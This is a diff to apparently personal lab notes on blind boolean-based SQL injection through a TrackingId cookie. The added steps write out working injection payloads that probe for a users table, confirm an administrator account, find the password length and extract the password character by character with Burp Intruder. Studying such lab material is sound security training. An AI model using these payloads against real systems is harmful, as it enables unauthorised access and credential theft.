@@ -33,7 +33,7 @@ SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
 - now open burp to confirm that this is vulnurable, intercept request and send request to repeater
 - to test for bling based SQLI is to force 2 use cases and see how the application response one false and one true
   - if two responses are different then its expoitable
-- now to confirm parameter is vulnurable to blind SQLI
+## First confirm parameter is vulnurable to blind SQLI
 - the Query we will assume it will look like this
 ```
 SELECT tracking-id FROM tracking-table WHERE tracking-id = '73otf20UOtx4AXLk' 
@@ -48,3 +48,30 @@ SELECT tracking-id FROM tracking-table WHERE tracking-id = '73otf20UOtx4AXLk'
 - select tracking-id from tracking-table where trackingId = '73otf20UOtx4AXLk' and 1=0--'
 -> FALSE -> no Welcome back
 - since we dont get a welcome back message when query is false so its vulnurable to blind SQLI
+## Second Confirm DB has user table 
+- we build query like this
+```
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select 'x' from users LIMIT 1)='x'--'
+```
+- this will check if user table exists and select x value and copare it with x if user table exist we will get a welcome output
+- and we get a welcome output
+## Third Confirm user administartor exists
+- we build quiry like this
+```
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator')='administrator'--'
+```
+- we find a welcome output so user administartor exists
+## Enumerate the password of the administrator user
+- we first need to determine its length
+- we can do this by this query and change the value until we got now welcome in the output
+```
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>19)='administrator'--'
+```
+- at 19 we got welcome after that we got no ouput
+- now to the actual password we will use this query
+- we use burp intruder
+- we first put payload to iterate or brute force using burp
+```
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,1,1) from users where username='administrator')='a'--'
+```
+- we use cluster bomb on burp and do the attack the position to do the attack in are the charachters we want to check and the first argument in password substring
